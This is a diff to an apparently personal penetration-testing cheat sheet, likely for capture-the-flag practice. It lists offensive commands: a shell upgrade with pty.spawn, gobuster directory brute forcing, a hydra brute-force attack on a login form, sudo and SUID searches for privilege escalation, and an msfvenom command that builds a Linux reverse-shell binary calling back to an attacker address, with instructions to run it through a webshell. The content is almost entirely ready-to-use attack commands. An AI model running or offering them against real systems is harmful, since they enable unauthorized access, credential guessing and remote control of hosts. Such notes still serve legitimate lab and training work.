@@ -1,14 +1,29 @@
-Upgrade terminal
+`Upgrade terminal`
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ___
-To find Root Processes
+`Gobuster`
+```
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://ip -t 100 -q -o gobust.txt
+```
+___
+`Hydra` `To Find Username OR Password for login pages` 
+```
+hydra -L .dic -p test IP http-post-form "log=^USER^&pwd=^PWD^:Invalid username Or name of Error thrown" -t 30
+```
+
+___
+`To find Root Processes`
+```
+Sudo -l
+```
+OR
 ```
 find / -perm +6000 2>/dev/null | grep '/bin/'
 ```
 ___
-MsfVenom
+`MsfVenom`
 ```
 In Attackers pc: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=4040 -f elf > r.elf
 Upload the r.elf to webshell and excuite it to get the reverse shell
